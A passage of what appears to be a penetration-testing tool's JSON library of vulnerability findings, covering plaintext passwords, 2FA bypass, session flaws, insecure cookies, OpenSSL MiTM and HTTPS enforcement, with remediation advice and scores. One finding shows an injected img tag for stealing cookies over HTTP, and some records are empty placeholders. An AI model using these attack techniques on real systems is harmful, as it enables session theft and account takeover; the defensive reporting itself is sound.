when an insider with access to the database retrieves other users' credentials. For example, the database administrator (who may very well not have any legitimate business reason for accessing a particular application's functionality) could simply read credentials from the database and access the application as a valid application user. An outsider may also be able to obtain access to backup tapes or discarded hard discs containing database information which would in turn expose clear-text user credentials.\n","remediation":"For defense-in-depth, passwords should be salted and hashed to prevent an attacker from gaining access to clear-text passwords in the event that the database table containing user passwords is compromised. The first step toward securely storing passwords involves generating a random, fixed-length token (or \"salt\") when the clear-text password is about to be stored in the database:\n<pre><code class=\"dust\">SALT = rand( 64Bytes ) </pre>\nThe salt value and clear-text password should then be combined and hashed using a cryptographically secure hashing algorithm such as SHA-256. The concatenated password and salt can also be stored using an HMAC that utilizes SHA256.\n<pre><code class=\"dust\">OUT = HMAC_SHA256( KEY, CONCAT( PW, SALT )  ) + \":\" + SALT </pre>\nOnce the password is salted and hashed, the hash and plaintext salt can be stored in the database alongside the username.\nAlternatively, the password can be stored using a key derivation function for passwords. A key derivation function derives one or more secret keys from a secret value such as a master key or other known information such as a password or passphrase using a pseudo-random function. Three examples include pbkdf2, bcrypt, or scrypt. In this case, developers must specify a \"work factor\" for the function. This parameter's value will change depending on the chosen function but should be tuned to execute in 1/100th of a second (lower/higher depending on peak user load requirements) in the production environment.\nNote: once passwords are salted and hashed in the database, any functionality which involves user credentials will need to be modified to account for the change in how passwords are stored. When a user logs in, the application will need to take the supplied clear-text password, combine it with the salt stored in the database, hash the combination and compare the resulting hash with the hash stored for that user. If the hashes match, the supplied password matches the one the user submitted initially.\nFor more information, consult the OWASP Password Storage Cheat Sheet:\nhttps://www.owasp.org/index.php/Password_Storage_Cheat_Sheet\n","cvss_base_score":5.7,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:S/C:C/I:C/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:03","updated_at":"2018-11-12 09:25:03","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":382,"plugin_id":null,"title":"External Links Detected From The facebook app","type":null,"description":"During our assessment we found some external links to some other domains.\n","poc":null,"impact":"These external references to the other sites are mentioned as information only.This shouldn't be considered as a vulnerability.\n","remediation":"Ensure that all external links from the facebook app which are related to Distell directly or indirectly , are protected against critical security vulnerabilities.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:03","updated_at":"2018-11-12 09:25:03","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":383,"plugin_id":null,"title":"Authentication Bypass Issues","type":null,"description":"During our testings we found that by tampering the response generated by two factor authentication request, we were able to bypass the two factor authentication and log into the application.\n","poc":null,"impact":"Account of any user can be compromised through successful exploitation of this vulnerability.\n","remediation":"Entitlement checks should be performed on the server on every request to validate that the user has the needed privileges to perform the action or display the data. Any attempts to perform actions that are not specifically allowed for the role should be denied.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:03","updated_at":"2018-11-12 09:25:03","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":388,"plugin_id":null,"title":"Reliance on Cookies without Validation and Integrity Checking","type":null,"description":"FrontPage defines three kinds of users for every FrontPage web: administrators, authors and browsers (end-users). All permissions are cumulative; all authors also have browsing permission, and all administrators also have authoring and browsing permissions. In FrontPage, the list of administrators, authors and browsers is defined on a per-web basis. All content in a FrontPage web will be accessible to the same set of users and groups. It is not possible to control permissions on a per-file or per-directory basis with FrontPage. All FrontPage sub-webs either inherit the permissions (list of administrators, authors and browsers) of the FrontPage root web or use their own, unique permissions. Each FrontPage web (including each sub-web) contains copies of three ISAPI DLLs that make up the FrontPage Sever Extensions. These DLLs are created in directories below the top-level directory of a FrontPage web:\n--_vti_bin/_vti_adm/admin.dll for administrative tasks\n--_vti_bin/_vti_aut/author.dll for authoring FrontPage webs\n--_vti_bin/shtml.dll for browse-time FrontPage components such as form handlers.\n\n","poc":null,"impact":"It is possible to upload, modify or delete web pages, scripts and files on the web server\n","remediation":"It is recommended that you upgrade to the latest FrontPage version available, which can be found at: http://www.microsoft.com/frontpage/\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:03","updated_at":"2018-11-12 09:25:03","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":389,"plugin_id":null,"title":"MS13-006: Vulnerability in Microsoft Windows Could Allow Security Feature Bypass","type":null,"description":"The remote host contains a flaw in the handling of SSL version 3 (SSLv3) and TLS (Transport Layer Security) protocols. An attacker can inject specially crafted content into an SSL/TLS session, which could allow an attacker to bypass security features of SSLv3 and TLS protocols in order to intercept communications.\nNote that we carried out tests for Microsoft IIS HTTPS and TLS-capable FTP servers, which are known to use MS13-006 update files. Other SSL/TLS implementations may also be affected. To test all SSL/TLS services Nessus finds, configure the 'Report paranoia' preference setting to 'Paranoid (more false alarms).'\n","poc":null,"impact":"An attacker can inject specially crafted content into an SSL/TLS session, which could allow an attacker to bypass security features of SSLv3 and TLS protocols in order to intercept communications.\n","remediation":"Microsoft has released a set of patches for Windows Vista, 2008, 7, 2008 R2, 8, and 2012 :\nhttp://technet.microsoft.com/en-us/security/Bulletin/MS13-006\nFor other SSL/TLS implementations, contact the vendor for updates.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:03","updated_at":"2018-11-12 09:25:03","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":390,"plugin_id":null,"title":"Configuration","type":null,"description":"Weaknesses in this category are typically introduced during the configuration of the software.\n","poc":null,"impact":"Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise.\n","remediation":"ATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:03","updated_at":"2018-11-12 09:25:03","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":392,"plugin_id":null,"title":"Session Not Invalidated After Logout","type":null,"description":"The application does not properly invalidate a user's session on the server after the user initiates logout. User sessions remain active on the server, and any requests submitted including the user's session identifier will execute successfully, as though the user had made those requests.\n","poc":null,"impact":"Leaving the user's session active after the user initiates logout provides the attacker with a larger window in which to steal a victim's session and impersonate that user in the application. The session token can be obtained through various techniques, such as intercepting network traffic (\"Man-in-the-Middle\" or \"MitM\"), Cross-Site Scripting (XSS), Cross-Site Tracing (XST), and in the case of URL-based session token transmission, local inspection of browser history.\nIn addition to prolonging the session identifier's exposure to attack, failing to invalidate the user's session server-side also leaves the user with no way to deny an attacker's access once the victim discovers that their session has been compromised.\n","remediation":"The user's HTTP session should be terminated on the server immediately after a logout action is performed. It is important to note that simply deleting the cookie from the browser will not terminate the server session. The session must be invalidated at the server, using the HTTP container's intrinsic session abandonment mechanism.\n","cvss_base_score":6,"cvss_temporal_score":5,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:P/A:P/E:F/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:04","updated_at":"2018-11-12 09:25:04","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":395,"plugin_id":null,"title":"Authentication Bypass by Capture-replay","type":null,"description":"A capture-replay flaw exists when the design of the software makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and re-sending the same commands to the server. \nThis attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.","poc":"","impact":"","remediation":"--Always invalidate a session ID after the user logout.\n--Setup a session time out for the session IDs.\n--Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.\n--Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.\n--Encrypt the session data associated with the session ID.\n--Use multifactor authentication.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:04","updated_at":"2018-11-29 05:49:15","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":"","likelihood_text":""},{"id":403,"plugin_id":null,"title":"Session Identifier Passed In Query String","type":null,"description":"Session identifiers are exposed in transit between the client and server via URL query string parameters. URLs may be stored or viewed in multiple places during and after a request is made to the server. The following scenarios demonstrate how session identifiers could be leaked:\n--If the URL is requested by clicking a link or manually entering the address, the query string (including the session identifier) can be seen in the browser address bar\n--URLs are often logged in multiple places including the browser history, proxy logs, and web server logs\n--The session identifier may be leaked as part of the URL if the URL is passed to another site via the \"Referer\" header\n--URLs sent to the user as part of an HTML page may be cached on disk\n--The session identifier is leaked via copy and paste when one user sends a link to an authenticated portion of the application to another user\n\n","poc":null,"impact":"An attacker who gains access to any location where URLs are stored will be able to view session identifiers passed via the query string. Potential access vectors may include but are not limited to:\n--Browser history, proxy logs, web server logs, etc.\n--Utilizing other attacks, such as cross-site scripting, to extract sensitive information from the source of a page containing links to URLs with sensitive information in the query string\n--Shoulder-surfing the URL in a user's browser address bar\n\n","remediation":"The session identifier should never be passed between the client and server via URL query string parameters. Instead the server should create and store the session identifier and then set it in a cookie on the client.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:04","updated_at":"2018-11-12 09:25:04","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":414,"plugin_id":null,"title":"Secure Cookie Attribute Not Set","type":null,"description":"The 'Secure' attribute helps prevent cookies from being stolen by attackers on the same LAN as victims; cookies without this attribute can be stolen. If the 'Secure' attribute is set on a cookie, modern browsers will only send it over HTTPS connections (and not over HTTP).  If this attribute is not set, the cookie will be sent to the vulnerable site along with all HTTP requests to that site, and an attacker that can sniff traffic between the victim and the server will be able to steal the cookies.\nThe 'Secure' attribute needs to be set even if the vulnerable site only serves content over HTTPS and does not listen for HTTP traffic. An attacker on the same LAN as the victim can inject arbitrary content into any page from another site that is served over HTTP. If a victim has two pages open in a browser (e.g. https://vulnerable-site.com/ and http://www.example.com/), an attacker on the same LAN as the victim can inject content such as the following into http://www.example.com/:\n<img src=\"http://vulnerable-site.com/any_path\">\nThen, the attacker would eavesdrop the HTTP request to \"http://vulnerable-site.com/any_path\" and get the value of the cookie that will be automatically sent with the requests.\n","poc":null,"impact":"If the 'Secure' attribute is not set on a victim's cookie, the cookie can be stolen by an attacker on the same LAN as the victim. If the cookie contains the victim's session identifier, then the attacker can steal the victim's session.\n","remediation":"The 'Secure' attribute should be set on all cookies that contain sensitive values such as session IDs. Many application servers allow this to be done declaratively or through an administration interface; other application servers require the attribute to be set programmatically. The mitigation details depend on the application server being used.\nNote that this mitigation is only feasible when the cookie does not need to be accessed by pages that are accessible over HTTP. Maintaining session state securely across a site with mixed HTTP and HTTPS content is non-trivial.\n","cvss_base_score":2.6,"cvss_temporal_score":2.2,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:H/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:05","updated_at":"2018-11-12 09:25:05","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":415,"plugin_id":null,"title":"Data Not Validated For Semantic Correctness","type":null,"description":"The application does not validate user input for semantic correctness. While there is server side validation in place to ensure that user input does not negatively impact the application or other users, the application fails to ensure that the data supplied matches the expected format for each given field. For example, an application input field that expects a zip code accepts strings of arbitrary content and length, but should only accept 5 character numeric strings.\n","poc":null,"impact":"Without proper validation, quality and integrity issues may exist since data being sent to the application may cause a failure in business logic. Additionally, malformed content may corrupt server-side application processing that relies on properly formed user input to execute correctly.\n","remediation":"All user-controlled input should be validated to ensure that data matches an expected format. Proper validation can be implemented using white-lists (often through the use of regular expression matching) to allow user-supplied data to pass if it contains only valid characters. Input validation routines should always check data for length, range, type and format.\n","cvss_base_score":5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:05","updated_at":"2018-11-12 09:25:05","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":416,"plugin_id":null,"title":"Least Privilege Violation - Use of Privileged Code","type":null,"description":"The application violates the principle of least privilege by executing more code than is strictly necessary in a privileged context. Critical sections of code are often executed as users with elevated privileges, such as root in *nix systems. Failure to revert to a lower privilege level after executing these restricted operations grants more access to system resources than necessary for subsequent operations.\nConsider an example in which a Java application uses the AccessController.doPrivileged block to perform a mix of restricted and normal user operations. Here, all operations will be executed with elevated privileges. Any code that does not require elevated privileges to execute properly will still run with elevated privileges. If this code contains any vulnerabilities, subsequent exploits will also execute with elevated privileges.\n","poc":null,"impact":"An attacker able to exploit vulnerabilities running with elevated privileges may be able to affect not only the application but the underlying system as well. The exact consequence of exploit depends on the vulnerability present being exploited with elevated privileges. This may include (but is not limited to) accessing restricted sections of the file system and executing arbitrary system commands with system-level privileges in an effort to further infiltrate the underlying network.\n","remediation":"The application must properly implement the principle of least privilege. The code base should be analyzed and modified accordingly to ensure that actions requiring elevated privileges and those that do not are separated into discrete blocks.\n","cvss_base_score":7.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:05","updated_at":"2018-11-12 09:25:05","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":426,"plugin_id":null,"title":"Cacheable HTTPS Content","type":null,"description":"Application content served over HTTPS is cached locally on disk. This occurs as a result of missing HTML cache control tags and missing or misconfigured cache control headers in HTTP responses from the server.\n","poc":null,"impact":"An attacker with local access to a user's web browser may be able to retrieve cached copies of resources that the user previously accessed, exposing any stored sensitive data.\n","remediation":"The web server should be configured to set cache behavior on all pages. To prevent a page from being cached, the Cache-Control directive must be set to no-store. This is the most secure of the cache-control directives. It instructs the browser not to cache the page and not store the page in its cache folder. This directive should be used for all sensitive pages. With this set, the application will have the greatest control possible over how its pages will be cached. Other directives, such as Pragma: no-cache and Expires HTTP headers should be set as well (Note: these headers do not guarantee that a browser will not store the data in its cache folder, but are honored in certain browsers).\nNote: The (misleadingly named) \"no-cache\" directive instructs the browser to revalidate with the server before serving the page from the cache. The browser may still store the page in its cache. In addition, some modern browsers have been modified to implement the \"no-cache\" directive like the \"no-store\" directive. To be on the safer side, developers can use both \"no-cache\" and \"no-store\" when serving sensitive pages.\n","cvss_base_score":2.6,"cvss_temporal_score":2.1,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:05","updated_at":"2018-11-12 09:25:05","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":432,"plugin_id":null,"title":"Bug in State machine related message delivery","type":null,"description":"Imagine a forged message delivery\nmark a successfully delivered message state to failed.\n","poc":null,"impact":"Notification System\nATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","remediation":"Notification System\nATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:06","updated_at":"2018-11-12 09:25:06","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":435,"plugin_id":null,"title":"OpenSSL &#039;ChangeCipherSpec&#039; MiTM Vulnerability","type":null,"description":"The application is vulnerable to a \"man-in-the-middle\" attack due to an issue in the \"ChangeCipherSpec\" protocol of OpenSSL (CVE 2014-0224). The \"ChangeCipherSpec\" protocol is used by OpenSSL to alter the encryption cipher used to establish an HTTPS connection between the client and server. This is done through a single encrypted request that is sent by the client and server during the SSL/TLS handshake. The request consists of a single byte, which directs the client and server to switch to symmetric key encryption using the keys that were negotiated during the handshake.\nThe \"ChangeCipherSpec\" protocol can be leveraged by an attacker to carry out a \"man-in-the-middle\" attack by sending consecutive \"ChangeCipherSpec\" messages to an end point during the wrong part of the SSL/TLS handshake. By sending the message at the wrong time the application can start communicating over an encrypted channel before new keys have been established, allowing predictable keys to be used for the connection.  Note: for this attack to be successful both the client and server involved in the connection will need to be using one of the following vulnerable versions of OpenSSL:\n--OpenSSL 0.9.8y and under\n--OpenSSL 1.0.0 to 1.0.0l\n--OpenSSL 1.0.1 to 1.0.1g\n\n","poc":null,"impact":"A \"man-in-the-middle\" attack carried out due to the use of predictable keys as part of the SSL/TLS connection will allow an attacker to view and tamper with the data passed between the client and server. Depending on the sensitivity of the data exposed, an attacker can gain access to personally identifiable information (PII) and any other sensitive data handled by the application. An attacker may also be able to modify application requests and responses, leading to unexpected application behavior as well as unauthorized access to application functionality.\nNote the presence of this vulnerability on a sever can additionally lead to a condition in which an attacker can perform a denial of service (DoS) attack against the host, due to a NULL pointer dereference that causes the daemon to crash.\n","remediation":"The instance of the OpenSSL library on affected host should be upgraded to the latest stable version of OpenSSL. Organizations should also use a patch management system to keep software up to date without disrupting ongoing business. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:06","updated_at":"2018-11-12 09:25:06","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":437,"plugin_id":null,"title":"User-Controllable Error Message","type":null,"description":"User defined input is inserted into a valid error page returned by the application. The text provided can be transmitted to the application via a query string parameter as part of an HTTP GET request, or within the body of an HTTP POST request.\n","poc":null,"impact":"Error messages controlled by the end user can result in attackers launching targeted attacks directly against the application's user base, subvert safeguards currently in place, or deface the application. If the error page allows for arbitrary code to be injected into the page, attackers may execute injection-based attacks. Attacks such as cross site scripting can be used in this scenario to alter page content with malicious HTML or JavaScript code. Even if arbitrary code execution is not possible, the error page can be leveraged by an attacker to create their own custom error page which can be used to \"phish\" valid application users.\n","remediation":"Error messages displayed by the application should be generic in nature and shouldn't contain data sent from the client. Generic error messages should provide the end user with as little detail as possible; such messages should only alert the user that an error occurred. The detailed log of the event that caused the error should then be generated and stored server side for authorized personnel to review.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:06","updated_at":"2018-11-12 09:25:06","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":445,"plugin_id":null,"title":"Abuse of Functionality","type":null,"description":"Abuse of Functionality is an attack technique that uses a web site's own features and functionality to attack itself or others. Abuse of Functionality can be described as the abuse of an application's intended functionality to perform an undesirable outcome. These attacks have varied results such as consuming resources, circumventing access controls, or leaking information. The potential and level of abuse will vary from web site to web site and application to application. Abuse of functionality attacks are often a combination of other attack types and/or utilize other attack vectors.\n","poc":null,"impact":"Abuse of Functionality can be used to abuse of an application's intended functionality to perform an undesirable outcome.\n","remediation":"Review the business logic of the application and ensure that no users can abuse application's indented functionality.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:06","updated_at":"2018-11-12 09:25:06","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":448,"plugin_id":null,"title":"HTTPS Not Enabled","type":null,"description":"The application does not use HTTPS to encrypt traffic over the network. TLS and SSL are common protocols used in protecting the confidentiality and integrity of network communications over HTTPS. At a high level, this is accomplished by first verifying the server's identity through the use of trusted certificate authorities. Then, the browser and server generate a shared secret, which is used to encrypt all network communication.\n","poc":null,"impact":"HTTPS is not enabled on the application server resulting in application traffic being delivered in plaintext. An attacker listening on any network between the victim and the application server may view and modify application traffic.\n","remediation":"HTTPS should be enabled on the application server. The exact process of enabling HTTPS depends on the technology stack, but there are common considerations for all HTTPS implementations. The first consideration is to only use TLS v1.1 or v1.2; if possible, SSL v2, SSL v3 and TLS v1.0 should be avoided due to known protocol security vulnerabilities. The second consideration is to only support strong cryptographic ciphers. The properties of strong cryptographic ciphers are ciphers that contain authentication and have a key size of 128 bits or higher.\nIn addition to the previous configuration changes, these best practices should be followed to prevent known attacks against TLS/SSL:\n--Disable TLS compression\n--Disable client-initiated renegotiation\n--Generate a certificate per host, avoid wildcard certificates\n\nFor more information on protecting transport layer security, see the Transport Layer Protection Cheat Sheet created by OWASP at https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet\n","cvss_base_score":6.8,"cvss_temporal_score":5.9,"cvss_vector":"(AV:N/AC:L/Au:S/C:C/I:N/A:N/E:H/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:06","updated_at":"2018-11-12 09:25:06","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":449,"plugin_id":null,"title":"Web Server RDP Access Is Allowed Over Internet","type":null,"description":"Exposing RDP to direct connections is risky. This setup not only gives remote attackers the opportunity to guess logon credentials, but also relies on the lack of a remotely-exploitable vulnerability in Microsoft's RDP implementation.\nMicrosoft's Security Bulletin MS12-020, released in March 2012, described critical vulnerability in Microsoft's RDP implementation on most Windows platforms (CVE-2012-0002). This bug could allow a remote unauthenticated attacker to run arbitrary code on the affected system by sending \"a sequence of specially crafted RDP packets.\nNote: We didn't find the MS12-20 bug with the RDP installation of the target web server.\n","poc":null,"impact":"ATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","remediation":"ATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:06","updated_at":"2018-11-12 09:25:06","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":457,"plugin_id":null,"title":"Insufficient Verification of Data Authenticity","type":null,"description":"Content spoofing, also referred to as content injection or virtual defacement, is an attack targeting a user made possible by an injection vulnerability in a web application. When an application does not properly handle user supplied data, an attacker can supply content to a web application, typically via a parameter value, that is reflected back to the user. This presents the user with a modified page under the context of the trusted domain.\nThis attack is typically used as, or in conjunction with, social engineering because the attack is exploiting a code-based vulnerability and a user's trust.\n","poc":null,"impact":"The attacker typically leads an Internet user to spoofed content through e-mail, bulletin-board postings and chat-room transmissions. In some cases, an attacker may modify information and links in an established Web site by accessing and altering content on the server. The latter type of content spoofing is more difficult to detect because there is no readily apparent difference to the casual observer.\nThe most dangerous content spoofing is done with DHTML (dynamic HTML) content sources such as forms and log-in applications. When a Web page with spoofed content is viewed by an Internet user, the location bar displays what appears to be a legitimate URL. However, the attacker has generated or altered by the page. As a result, when the user enters sensitive data (such as a credit card number, password, bank account number, birth date, or Social Security number), the attacker can obtain the data for identity theft or some other fraudulent purpose.\n","remediation":"The only way to protect application against this weakness is to perform additional checks on data authenticity. When developing the application consider all possible input data sources and use unique tokens to validate user input, always verify client and server identity.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":458,"plugin_id":null,"title":"No validation on banking application&#039;s callback URL","type":null,"description":"There is lack of validation on the Banking Application Side when the Payment Gateway redirects a user to the Banking Application's callback URL. As a result, a virtual credit card can be created without paying any service charges, by sending the request directly to the callback URL of Payment Gateway.\n","poc":null,"impact":"There is lack of validation on the Banking Application Side when the Payment Gateway redirects a user to the Banking Application's callback URL. As a result, a virtual credit card can be created without paying any service charges, by sending the request directly to the callback URL of Payment Gateway.\n","remediation":"There should be enough validations on the callback URL including whether the URL is redirected by the Payment Gateway or directly called by an attacker\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":459,"plugin_id":null,"title":"HTTPS Not Enforced","type":null,"description":"The application uses HTTPS to encrypt traffic sent over the network but can also be accessed over an unencrypted HTTP connection. TLS and SSL are common protocols used in protecting the confidentiality and integrity of network communications over HTTPS. At a high level, this is accomplished by first verifying the server's identity through the use of trusted certificate authorities. Then, the browser and server generate a shared secret, which is used to encrypt all network communication.\n","poc":null,"impact":"While the application may initially be served over HTTPS, it is also accessible over HTTP, resulting in application traffic being sent in plaintext. If a victim accesses the application with an HTTP-based URL, an attacker listening on any network between the victim and the application server may view and modify application traffic.\n","remediation":"HTTPS should be enabled and enforced on the application server. Once HTTPS has been properly configured, ensure that the application requires HTTPS for access to all application resources, including JavaScript files, style sheets, and images. When a user attempts to navigate to any part of the application over HTTP, the application should redirect the user to the HTTPS version of the application. Lastly, it is recommended that applications are deployed with HTTP Strict Transport Security (HSTS). HSTS forces the browser to access a site only over HTTPS, and prevents access in cases where the authenticity of the X.509 certificate cannot be verified. HSTS is supported in recent versions of the Chrome, Firefox, and Opera web browsers. To enable HSTS, simply add the Strict-Transport-Security header to the response header when users first access the site over HTTPS. For more information on the HSTS header, refer to the relevant OWASP page, located at https://www.owasp.org/index.php/HTTP_Strict_Transport_Security.\n","cvss_base_score":6.1,"cvss_temporal_score":5,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:P/A:N/E:F/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Low","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":460,"plugin_id":null,"title":"No anti-automation in credit card creation process","type":null,"description":"There is no anti-automation while creating a virtual credit card. An attacker can use automated scripts to exhaust credit card numbers. As a result, Credit Card Numbers can be exhausted and be therefore made unavailable to users leading to a Denial of Service (DoS) attack. It can also lead to other attacks including Credit Card Number pattern 